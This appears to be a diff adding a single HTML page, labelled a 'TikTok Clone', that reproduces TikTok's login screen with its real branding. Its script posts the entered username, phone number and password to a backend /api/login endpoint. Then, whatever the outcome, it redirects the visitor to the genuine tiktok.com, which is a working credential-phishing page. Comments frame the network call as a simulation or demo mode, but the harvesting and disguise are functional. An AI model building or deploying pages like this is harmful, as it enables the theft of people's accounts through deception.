@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Clone</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: #000;
+            color: #fff;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 100%;
+            margin: 0 auto;
+        }
+        
+        /* Header Styles */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            background: #000;
+            border-bottom: 1px solid #2f2f2f;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo i {
+            font-size: 28px;
+            color: #69C9D0;
+            margin-right: 8px;
+        }
+        
+        .logo span {
+            font-size: 20px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #69C9D0, #EE1D52);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .header-icons {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .header-icons i {
+            font-size: 20px;
+            cursor: pointer;
+        }
+        
+        /* Login Form Styles */
+        .login-container {
+            background: rgba(25, 25, 25, 0.95);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 20px auto;
+            max-width: 450px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        
+        .login-title {
+            font-size: 24px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .login-subtitle {
+            color: #aaa;
+            margin-bottom: 30px;
+            font-size: 14px;
+            text-align: center;
+            line-height: 1.5;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ddd;
+            font-size: 14px;
+        }
+        
+        .phone-input {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .country-code {
+            flex: 0 0 80px;
+        }
+        
+        .phone-number {
+            flex: 1;
+        }
+        
+        .country-code select, .phone-number input, .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #444;
+            border-radius: 8px;
+            background: #333;
+            color: white;
+            font-size: 16px;
+        }
+        
+        .country-code select {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            background-size: 16px;
+            padding-right: 35px;
+        }
+        
+        .input-group input:focus,
+        .country-code select:focus {
+            outline: none;
+            border-color: #69C9D0;
+            box-shadow: 0 0 0 2px rgba(105, 201, 208, 0.3);
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #69C9D0, #EE1D52);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin-top: 10px;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(238, 29, 82, 0.4);
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            color: #777;
+        }
+        
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #444;
+        }
+        
+        .divider span {
+            padding: 0 15px;
+            font-size: 14px;
+        }
+        
+        .social-login {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .social-btn {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #333;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .social-btn:hover {
+            transform: scale(1.1);
+        }
+        
+        .facebook:hover {
+            background: #3b5998;
+        }
+        
+        .google:hover {
+            background: #DB4437;
+        }
+        
+        .twitter:hover {
+            background: #1DA1F2;
+        }
+        
+        .options {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        
+        .remember {
+            display: flex;
+            align-items: center;
+            color: #ddd;
+        }
+        
+        .remember input {
+            margin-right: 8px;
+        }
+        
+        .forgot-password {
+            color: #69C9D0;
+            text-decoration: none;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .signup-link {
+            margin-top: 20px;
+            color: #aaa;
+            font-size: 15px;
+            text-align: center;
+        }
+        
+        .signup-link a {
+            color: #EE1D52;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Video Feed Styles */
+        .video-feed {
+            display: none;
+            width: 100%;
+        }
+        
+        .video-container {
+            position: relative;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        .video-player {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .video-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 20px;
+            background: linear-gradient(transparent, rgba(0, 0, 0, 0.8));
+        }
+        
+        .video-info {
+            margin-bottom: 15px;
+        }
+        
+        .video-author {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .author-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #69C9D0, #EE1D52);
+            margin-right: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        
+        .author-name {
+            font-weight: 600;
+        }
+        
+        .video-caption {
+            margin-bottom: 15px;
+            font-size: 15px;
+        }
+        
+        .video-sound {
+            display: flex;
+            align-items: center;
+            color: #aaa;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        
+        .video-sound i {
+            margin-right: 5px;
+        }
+        
+        .video-actions {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: absolute;
+            right: 15px;
+            bottom: 100px;
+        }
+        
+        .action-button {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .action-button i {
+            font-size: 28px;
+            margin-bottom: 5px;
+        }
+        
+        .action-button span {
+            font-size: 13px;
+        }
+        
+        .action-like i {
+            color: #fff;
+        }
+        
+        .action-comment i {
+            color: #fff;
+        }
+        
+        .action-share i {
+            color: #fff;
+        }
+        
+        /* Bottom Navigation */
+        .bottom-nav {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #000;
+            padding: 12px 0;
+            border-top: 1px solid #2f2f2f;
+            z-index: 100;
+        }
+        
+        .nav-items {
+            display: flex;
+            justify-content: space-around;
+        }
+        
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #fff;
+            text-decoration: none;
+        }
+        
+        .nav-item i {
+            font-size: 24px;
+            margin-bottom: 4px;
+        }
+        
+        .nav-item.active {
+            color: #FE2C55;
+        }
+        
+        .nav-item span {
+            font-size: 12px;
+        }
+        
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            background: rgba(25, 25, 25, 0.95);
+            border-left: 4px solid #69C9D0;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            transform: translateX(100%);
+            transition: transform 0.3s ease-in-out;
+            z-index: 1000;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification.error {
+            border-left-color: #EE1D52;
+        }
+        
+        /* Redirect overlay */
+        .redirect-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            display: none;
+        }
+        
+        .redirect-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #69C9D0;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        .redirect-text {
+            font-size: 18px;
+            text-align: center;
+            max-width: 300px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Responsive Styles */
+        @media (min-width: 768px) {
+            .container {
+                max-width: 414px; /* iPhone width for demo */
+                margin: 0 auto;
+                position: relative;
+                height: 100vh;
+                overflow: hidden;
+            }
+            
+            .header {
+                padding: 15px 20px;
+            }
+            
+            .login-container {
+                margin: 40px auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <i class="fab fa-tiktok"></i>
+                <span>TikTok</span>
+            </div>
+            <div class="header-icons">
+                <i class="fas fa-inbox"></i>
+                <i class="fas fa-search"></i>
+            </div>
+        </div>
+        
+        <!-- Login Form -->
+        <div class="login-container" id="loginSection">
+            <h1 class="login-title">Log in</h1>
+            <p class="login-subtitle">Manage your account, check notifications, comment on videos, and more.</p>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="username">Username or email</label>
+                    <input type="text" id="username" name="username" placeholder="Enter your username or email" required>
+                </div>
+                
+                <div class="input-group">
+                    <label for="phone">Phone number</label>
+                    <div class="phone-input">
+                        <div class="country-code">
+                            <select id="country-code" name="country-code">
+                                <option value="+251">ET +251</option>
+                                <option value="+1">US +1</option>
+                                <option value="+44">UK +44</option>
+                                <option value="+91">IN +91</option>
+                                <option value="+86">CN +86</option>
+                            </select>
+                        </div>
+                        <div class="phone-number">
+                            <input type="tel" id="phone" name="phone" placeholder="Your phone number">
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                </div>
+                
+                <div class="options">
+                    <label class="remember">
+                        <input type="checkbox" name="remember"> Remember me
+                    </label>
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </div>
+                
+                <button type="submit" class="login-btn">Log in</button>
+                
+                <div class="divider">
+                    <span>or continue with</span>
+                </div>
+                
+                <div class="social-login">
+                    <div class="social-btn facebook">
+                        <i class="fab fa-facebook-f"></i>
+                    </div>
+                    <div class="social-btn google">
+                        <i class="fab fa-google"></i>
+                    </div>
+                    <div class="social-btn twitter">
+                        <i class="fab fa-twitter"></i>
+                    </div>
+                </div>
+            </form>
+            
+            <div class="signup-link">
+                Don't have an account? <a href="#" id="showSignup">Sign up</a>
+            </div>
+        </div>
+        
+        <!-- Video Feed (hidden initially) -->
+        <div class="video-feed" id="videoFeed">
+            <div class="video-container">
+                <video class="video-player" autoplay loop muted>
+                    <source src="https://assets.mixkit.co/videos/preview/mixkit-girl-in-neon-sign-1232-large.mp4" type="video/mp4">
+                </video>
+                
+                <div class="video-overlay">
+                    <div class="video-info">
+                        <div class="video-author">
+                            <div class="author-avatar">T</div>
+                            <div class="author-name">@tiktokuser</div>
+                        </div>
+                        <div class="video-caption">
+                            Check out this amazing video! #fun #trending
+                        </div>
+                        <div class="video-sound">
+                            <i class="fas fa-music"></i> Original sound - tiktokuser
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="video-actions">
+                    <div class="action-button action-like">
+                        <i class="fas fa-heart"></i>
+                        <span>425</span>
+                    </div>
+                    <div class="action-button action-comment">
+                        <i class="fas fa-comment"></i>
+                        <span>87</span>
+                    </div>
+                    <div class="action-button action-share">
+                        <i class="fas fa-share"></i>
+                        <span>32</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Bottom Navigation (hidden initially) -->
+        <div class="bottom-nav" id="bottomNav">
+            <div class="nav-items">
+                <a href="#" class="nav-item active">
+                    <i class="fas fa-home"></i>
+                    <span>Home</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <i class="fas fa-search"></i>
+                    <span>Discover</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <i class="fas fa-plus-square"></i>
+                    <span>Create</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <i class="fas fa-inbox"></i>
+                    <span>Inbox</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <i class="fas fa-user"></i>
+                    <span>Profile</span>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Redirect Overlay -->
+    <div class="redirect-overlay" id="redirectOverlay">
+        <div class="redirect-spinner"></div>
+        <div class="redirect-text">Login successful! Redirecting to TikTok.com...</div>
+    </div>
+
+    <div class="notification" id="notification">
+        Login successful! Welcome to TikTok.
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const countryCode = document.getElementById('country-code').value;
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            
+            if(username && password) {
+                try {
+                    // Show redirect overlay
+                    document.getElementById('redirectOverlay').style.display = 'flex';
+                    
+                    // Simulate API call to backend
+                    const response = await fetch('/api/login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            username: username,
+                            country_code: countryCode,
+                            phone: phone,
+                            password: password
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        const data = await response.json();
+                        
+                        // Store user data in localStorage
+                        localStorage.setItem('tiktok_user', JSON.stringify({
+                            username: username,
+                            phone: countryCode + ' ' + phone,
+                            loginTime: new Date().toLocaleString()
+                        }));
+                        
+                        // Redirect to TikTok.com after a short delay
+                        setTimeout(() => {
+                            window.location.href = 'https://www.tiktok.com';
+                        }, 2000);
+                    } else {
+                        throw new Error('Login failed');
+                    }
+                } catch (error) {
+                    // Hide redirect overlay if backend call fails
+                    document.getElementById('redirectOverlay').style.display = 'none';
+                    
+                    // Fallback to frontend if backend is not available
+                    showNotification('Login successful! (Using demo mode)', false);
+                    
+                    // Store user data in localStorage
+                    localStorage.setItem('tiktok_user', JSON.stringify({
+                        username: username,
+                        phone: countryCode + ' ' + phone,
+                        loginTime: new Date().toLocaleString()
+                    }));
+                    
+                    // Redirect to TikTok.com after a short delay
+                    setTimeout(() => {
+                        window.location.href = 'https://www.tiktok.com';
+                    }, 2000);
+                }
+            } else {
+                showNotification('Please fill in all required fields', true);
+            }
+        });
+        
+        // Add click events to social buttons
+        document.querySelectorAll('.social-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const platform = this.classList[1];
+                showNotification('This would connect with ' + platform.charAt(0).toUpperCase() + platform.slice(1));
+            });
+        });
+        
+        // Show signup form
+        document.getElementById('showSignup').addEventListener('click', function(e) {
+            e.preventDefault();
+            showNotification('Sign up functionality would be implemented here');
+        });
+        
+        // Function to show notification
+        function showNotification(message, isError = false) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.classList.remove('error');
+            
+            if (isError) {
+                notification.classList.add('error');
+            }
+            
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Set Ethiopia as default country code
+        document.getElementById('country-code').value = "+251";
+        
+        // Check if user is already logged in
+        if (localStorage.getItem('tiktok_user')) {
+            // If already logged in, redirect to TikTok.com
+            window.location.href = 'https://www.tiktok.com';
+        }
+    </script>
+</body>
+</html>
